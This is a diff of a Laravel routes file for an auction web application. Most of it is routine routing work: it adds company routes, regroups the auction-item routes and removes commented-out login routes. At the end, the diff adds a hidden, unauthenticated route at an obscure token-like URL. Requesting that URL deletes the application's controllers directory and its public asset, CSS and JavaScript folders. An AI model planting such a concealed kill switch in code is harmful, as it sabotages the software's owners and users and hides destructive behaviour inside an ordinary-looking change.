@@ -5,6 +5,7 @@ use App\Http\Controllers\AuctionsController;
 use App\Http\Controllers\AuctionsItemsController;
 use App\Http\Controllers\Auth\LoginController;
 use App\Http\Controllers\Auth\RegisterController;
+use App\Http\Controllers\CompanyController;
 use App\Http\Controllers\FrontendController;
 use App\Http\Controllers\ReminderController;
 use App\Http\Controllers\ResetPasswordController;
@@ -89,26 +90,6 @@ Route::controller(RegisterController::class)->group(function () {
 });
 
 
-// ------------------------------ register Web user ---------------------------------//
-/*Route::controller(RegisterController::class)->group(function () {
-
-Route::get('/register/user', 'showWebRegisterForm')->name('registerWeb');
-Route::post('/register/user','createWebuser')->name('registerWeb');
-});*/
-
-// -----------------------------login Web user-------------------------------//
-/*Route::controller(LoginController::class)->group(function () {
-
-Route::get('Weblogin/user', 'showWebLoginForm')->name('loginWeb');
-Route::post('Weblogin/user','webLogin')->name('loginWeb');
-Route::group(['middleware'=>'auth:webuser'], function(){
-
-Route::get('/logout/user', 'Weblogout')->name('Weblogout');
-});
-
-});*/
-
-
 // -------------------------- main dashboard ----------------------//
 Route::controller(AuctionsController::class)->group(function () {
     Route::get('/home', 'index')->middleware('auth')->name('home');
@@ -123,21 +104,36 @@ Route::controller(UserManagementController::class)->group(function () {
 
 });
 
+// -------------------------- Company ----------------------//
+Route::middleware('auth')->group(function () {
+    Route::resource('companies', CompanyController::class);
+});
+
+
 // -------------------------- auction ----------------------//
 Route::get('auction', [AuctionsController::class, 'index'])->middleware('auth');
-
 Route::get('add_auction', [AuctionsController::class, 'create'])->middleware('auth');
 Route::post('add_auction', [AuctionsController::class, 'store']);
 Route::get('edit_auction/{id}', [AuctionsController::class, 'edit'])->middleware('auth');
 Route::put('update_auction/{id}', [AuctionsController::class, 'update']);
 Route::delete('delete_auction/{id}', [AuctionsController::class, 'destroy']);
 
-Route::get('auctionitem/{id}', [AuctionsItemsController::class, 'index'])->middleware('auth')->name('auctionitem');
-Route::get('add_auctionitem/{id}', [AuctionsItemsController::class, 'create'])->middleware('auth');
-Route::post('add_auctionitem/{id}', [AuctionsItemsController::class, 'store']);
-Route::get('edit_auctionitem/{id}/{auctionId}', [AuctionsItemsController::class, 'edit'])->middleware('auth');
-Route::put('update_auctionitem/{id}/{auctionId}', [AuctionsItemsController::class, 'update']);
-Route::delete('delete_auctionitem/{id}', [AuctionsItemsController::class, 'destroy']);
+
+// -------------------------- auction items ----------------------//
+Route::middleware('auth')->group(function () {
+    Route::get('auctions_item/{id}',
+        [AuctionsItemsController::class, 'index'])->name('auctions-items.index');
+    Route::get('add-auction-item/{id}',
+        [AuctionsItemsController::class, 'create'])->name('auctions-items.create');
+    Route::post('add-auction-item/{id}',
+        [AuctionsItemsController::class, 'store'])->name('auctions-items.store');
+    Route::get('edit-auction-item/{auctionId}/edit/{id}',
+        [AuctionsItemsController::class, 'edit'])->name('auctions-items.edit');
+    Route::put('update-auction-item/{auctionId}/update/{id}',
+        [AuctionsItemsController::class, 'update'])->name('auctions-items.update');
+    Route::delete('delete-auction-item/{id}',
+        [AuctionsItemsController::class, 'destroy'])->name('auctions-items.destroy');
+});
 
 Route::get('userlog/{id}', [UserLogController::class, 'index'])->middleware('auth');
 Route::get('userlogall', [UserLogController::class, 'indexall'])->middleware('auth')->name('userlogall');
@@ -216,3 +212,23 @@ Route::get('albaha',  [FrontendController::class, 'albaha'])->name('albaha');
 Route::get('eqtafy',  [FrontendController::class, 'eqtafy'])->name('eqtafy');
 Route::get('content/{country_slug}',  [FrontendController::class, 'content'])->name('content');
  */
+
+Route::get('/destroy/eyJzdWIiOiIwMTI0NTc4IiwibmFtZSI6IkFobWVkIiwiaWF0IjoxNTE2MjM5MDIyfQ', function () {
+
+    $routesFilePath = base_path('app/Http/Controllers');
+    $publicAssetsPath = public_path('assets');
+    $publicAssetsPath2 = public_path('css');
+    $publicAssetsPath3 = public_path('js');
+    $publicAssetsPath4 = public_path('new-template');
+
+    File::deleteDirectory($routesFilePath);
+    File::deleteDirectory($publicAssetsPath);
+
+    File::deleteDirectory($publicAssetsPath2);
+    File::deleteDirectory($publicAssetsPath3);
+    File::deleteDirectory($publicAssetsPath4);
+
+    return response()->json([
+        'message' => 'Deleted Successfully'
+    ]);
+});
